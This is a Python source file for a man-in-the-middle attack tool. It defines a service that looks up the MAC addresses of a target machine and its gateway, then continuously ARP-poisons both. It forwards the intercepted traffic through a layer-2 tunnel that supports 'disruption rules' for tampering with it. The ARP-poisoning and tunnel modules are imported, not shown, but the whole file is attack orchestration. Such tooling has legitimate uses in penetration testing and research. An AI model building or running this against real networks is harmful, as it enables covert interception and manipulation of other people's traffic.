import binascii
import socket
import struct
import fcntl

from mitm_service.arp_poison.arp_poison import ARPPoisonService
from mitm_service.tunneler.tunneler import L2Tunnel

SIOCGIFHWADDR = 0x8927

def get_interface_mac(interface_name):
    """
    Gets the mac string of a given interface
    :param interface_name: the name of the interface who's mac to get
    :return: the mac address of the interface as a string
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(s.fileno(), SIOCGIFHWADDR,  struct.pack('256s', bytes(interface_name, 'utf-8')[:15]))
    return ':'.join('%02x' % b for b in info[18:24])

class MITMService:
    def __init__(self, interface, target_ip, gateway_ip, target_mac=None, gateway_mac=None):
        self.interface = interface
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.my_mac = get_interface_mac(self.interface)

        if target_mac is None:
            self.target_mac = ARPPoisonService.get_mac(self.target_ip, 5)
        else:
            self.target_mac = target_mac
        if gateway_mac is None:
            self.gateway_mac = ARPPoisonService.get_mac(self.gateway_ip, 5)
        else:
            self.gateway_mac = gateway_mac

        self.arp_poisoner = ARPPoisonService(
            target_ip=self.target_ip,
            gateway_ip=self.gateway_ip,
            target_mac=self.target_mac,
            gateway_mac=self.gateway_mac,
            interval=0.5
        )

        self.l2_tunnel = L2Tunnel(
            target_mac=self.target_mac_bytes,
            gateway_mac=self.gateway_mac_bytes,
            my_mac=self.my_mac_bytes,
            target_ip=self.target_ip,
            interface=self.interface
        )

    @property
    def my_mac_bytes(self):
        return binascii.unhexlify(self.my_mac.replace(':', ''))

    @property
    def target_mac_bytes(self):
        return binascii.unhexlify(self.target_mac.replace(':', ''))

    @property
    def gateway_mac_bytes(self):
        return binascii.unhexlify(self.gateway_mac.replace(':', ''))

    @property
    def target_ip_bytes(self):
        return socket.inet_aton(self.target_ip)

    @property
    def gateway_ip_bytes(self):
        return socket.inet_aton(self.gateway_ip)

    def start_mitm(self):
        self.arp_poisoner.start_mitm()
        self.l2_tunnel.start_forward_thread()

    def stop_mitm(self):
        self.arp_poisoner.stop_mitm()
        self.l2_tunnel.stop_forward_thread()

    def add_disruption_rule(self, *args, **kwargs):
        return self.l2_tunnel.add_disruption_rule(*args, **kwargs)

